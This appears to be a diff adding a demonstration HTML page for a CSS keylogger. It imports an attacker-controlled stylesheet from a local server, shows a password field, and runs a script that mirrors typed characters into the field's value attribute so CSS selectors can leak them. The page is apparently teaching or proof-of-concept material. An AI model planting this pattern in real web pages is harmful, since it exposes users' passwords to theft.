@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSS Keylogger</title>
+
+    <!--malicious CSS our attacker controls-->
+    <style>
+        @import url("http://127.0.0.1:8000/style.css");
+    </style>
+
+</head>
+<body>
+    <p>Enter all your valuable information:</p>
+    <input type="password">
+
+    <!--
+        The code below is necessary to make the CSS keylogger work in the first place.
+        If you remove this, the CSS selector won't be reevaluated and the keylogger won't work.
+        Reactive frameworks will reevaluate the CSS selector by default, so you don't need this.
+    -->
+    <script type="text/javascript">
+        (function() {
+          document.querySelectorAll('input').forEach(i => i.addEventListener('input', () => i.setAttribute('value', i.value)));
+        })();
+    </script>
+</body>
+</html>
